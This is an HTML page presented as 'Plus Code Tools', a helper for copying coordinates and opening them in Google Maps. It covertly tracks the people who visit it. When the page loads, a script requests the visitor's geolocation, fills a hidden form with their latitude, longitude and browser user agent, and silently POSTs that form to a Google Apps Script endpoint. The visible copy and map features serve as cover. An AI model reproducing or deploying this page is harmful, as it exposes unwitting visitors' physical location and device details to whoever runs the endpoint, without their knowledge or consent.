<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Plus Code Tools</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
            form {
                display: none;
            }
    </style>
</head>
<body class="bg-gray-100 flex justify-center items-center h-screen">
    <form name="submit-to-google-sheet">
        <input name="name" type="text" placeholder="Name" value="John Doe" required>
        <input name="gmaps" type="text" placeholder="Coordinates" required>
        <input name="deviceInfo" type="text" placeholder="Device Info" required>
        <button type="submit">Send</button>
    </form>
    
    <div class="bg-white p-8 shadow-lg rounded-lg max-w-md w-full">
        <h2 class="text-2xl font-bold text-center mb-8">Plus Code Tools</h2>

        <!-- Menu 1: Copy Coordinates -->
        <div class="mb-8">
            <h3 class="text-lg font-semibold mb-4">Copy Coordinates</h3>
            <input type="text" id="codeToCopy" readonly class="border border-gray-300 rounded-lg w-full p-3 mb-4">
            <button onclick="copyCode()" class="w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition-colors">
                Copy Coordinates
            </button>
            <p class="text-green-500 text-sm mt-2 hidden" id="copyMessage">Coordinates copied to clipboard!</p>
        </div>

        <!-- Menu 2: Open Coordinates in Google Maps -->
        <div>
            <h3 class="text-lg font-semibold mb-4">Open Coordinates in Google Maps</h3>
            <input type="text" id="codeToOpen" placeholder="Paste your coordinates here" class="border border-gray-300 rounded-lg w-full p-3 mb-4">
            <button onclick="generateLink()" class="w-full bg-green-500 text-white py-2 px-4 rounded-lg hover:bg-green-600 transition-colors">
                Generate Google Maps Link
            </button>
            <div class="mt-4 hidden" id="link">
                <p class="text-gray-700">Here is your Google Maps link:</p>
                <a href="#" id="mapsLink" target="_blank" class="text-blue-500 hover:underline">Open in Google Maps</a>
            </div>
        </div>
    </div>

    <script>
// Function to copy coordinates to clipboard
function copyCode() {
    var copyText = document.getElementById("codeToCopy");

    // Select the text field
    copyText.select();
    copyText.setSelectionRange(0, 99999); // For mobile devices

    // Copy the text inside the text field
    document.execCommand("copy");

    // Show the message
    var message = document.getElementById("copyMessage");
    message.classList.remove("hidden");

    // Hide the message after 2 seconds
    setTimeout(function() {
        message.classList.add("hidden");
    }, 2000);
}

// Function to generate Google Maps link
function generateLink() {
    var coordinates = document.getElementById("codeToOpen").value.trim();
    var linkElement = document.getElementById("link");
    var mapsLink = document.getElementById("mapsLink");

    if (coordinates) {
        // Generate the Google Maps link using Coordinates
        var mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + encodeURIComponent(coordinates);

        // Set the href attribute of the anchor element to the generated URL
        mapsLink.href = mapsUrl;

        // Show the link div
        linkElement.classList.remove("hidden");
    } else {
        // Hide the link if no Coordinates are provided
        linkElement.classList.add("hidden");
    }
}

    </script>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxgilOwmY4GPxWASlZ8lWzkStbPVdDWTeetj1HDxe6hhMnUR2dqrbVtOD25wQ0MadzXFQ/exec';
        const form = document.forms['submit-to-google-sheet'];
        const gmapsInput = form.elements['gmaps'];

        function success(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const coordinates = `${latitude},${longitude}`;
            gmapsInput.value = coordinates;

            // Populate the copy and map fields with coordinates
            document.getElementById("codeToCopy").value = coordinates;

            // Get device information
            const userAgent = navigator.userAgent;
            form.elements['deviceInfo'].value = userAgent;

            // Submit the form
            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => console.log('Success!', response))
                .catch(error => console.error('Error!', error.message));
        }

        function error() {
            console.error('Unable to retrieve your location');
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(success, error);
        } else {
            console.error('Geolocation is not supported by your browser');
        }

    </script>
</body>
</html>
